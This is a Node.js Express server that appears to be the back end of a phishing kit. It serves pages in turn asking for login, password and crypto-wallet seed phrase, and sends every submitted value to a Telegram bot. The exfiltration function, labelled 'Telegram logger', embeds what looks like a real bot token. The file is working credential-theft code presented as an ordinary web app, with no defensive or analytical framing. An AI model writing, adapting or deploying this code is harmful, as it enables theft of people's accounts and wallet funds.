// server.js

require('dotenv').config();
const express = require('express');
const helmet = require('helmet');
const morgan = require('morgan');
const path = require('path');
const cors = require('cors');
const rateLimit = require('express-rate-limit');
const fetch = require('node-fetch');
const { body } = require('express-validator');

const app = express();
const PORT = process.env.PORT || 3000;

// 🔒 Rate limiting
const limiter = rateLimit({
  windowMs: 15 * 60 * 1000,
  max: 100,
  message: 'Too many requests from this IP. Try again later.',
});

// 🛡️ Middleware
app.use(helmet());
app.use(cors());
app.use(morgan('dev'));
app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(limiter);

// 🌐 Static files
app.use(express.static(path.join(__dirname, 'public')));

// ✅ Input sanitization
const validate = [body('*').trim().escape()];

// 📤 Telegram logger
async function sendToTelegram(step, data) {
  const { BOT_TOKEN, CHAT_ID } = process.env;

  if (!BOT_TOKEN || !CHAT_ID) {
    console.warn('⚠️ Missing Telegram credentials');
    return;
  }

  const timestamp = new Date().toISOString();
  const message =
    `🛰️ *${step}*\n🕓 ${timestamp}\n\n` +
    Object.entries(data)
      .map(([key, val]) => `*${key}*: \`${val}\``)
      .join('\n');

  try {
    const res = await fetch(`https://api.telegram.org/bot/7224075845:AAHQDVu4GNQ6BIuxxO1HSgtrJYgURYczy5w/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: CHAT_ID,
        text: message,
        parse_mode: 'Markdown'
      }),
    });

    if (!res.ok) {
      console.error('❌ Telegram API error:', await res.text());
    } else {
      console.log(`✅ Sent to Telegram: ${step}`);
    }
  } catch (err) {
    console.error('❌ Telegram error:', err.message);
  }
}

// 🔁 Step handler
async function handleStep(step, req, res, nextPath = null) {
  console.log(`📥 ${step} data received:`);
  console.table(req.body);

  await sendToTelegram(step, req.body);

  nextPath ? res.redirect(nextPath) : res.status(200).send('✅ Submitted');
}

// 📄 Routes
app.get('/', (_, res) => res.sendFile(path.join(__dirname, 'public', 'login.html')));
app.get('/password', (_, res) => res.sendFile(path.join(__dirname, 'public', 'password.html')));
app.get('/seedphrase', (_, res) => res.sendFile(path.join(__dirname, 'public', 'seedphrase.html')));

// 📬 Form submissions
app.post('/login', validate, async (req, res) => {
  await handleStep('Login', req, res, '/password');
});

app.post('/password', validate, async (req, res) => {
  await handleStep('Password', req, res, '/seedphrase');
});

app.post('/seedphrase', validate, async (req, res) => {
  await handleStep('Seed Phrase', req, res);
});

// ❌ Generic 404 response
app.use((req, res) => {
  res.status(404).send('404 Not Found');
});

// 🚀 Launch server
app.listen(PORT, '0.0.0.0', () => {
  console.log(`🚀 Server running: http://127.0.0.1:5500`);
});
